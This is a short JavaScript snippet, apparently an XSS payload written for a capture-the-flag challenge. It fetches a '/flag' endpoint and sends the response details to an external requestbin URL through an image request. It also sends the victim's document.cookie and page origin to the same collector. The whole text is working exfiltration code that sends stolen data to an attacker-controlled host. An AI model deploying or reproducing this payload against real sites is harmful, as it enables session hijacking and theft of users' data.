fetch("https://mathme.be.ax/flag").then(function(x) {
    (new Image()).src="https://requestbin.io/ub238iub?x="+JSON.stringify({ok: x.ok, status: x.status, body: x.body, url: x.url});
}

(new Image()).src="https://requestbin.io/ub238iub?cookie=" + document.cookie + "&origin=" + document.origin;
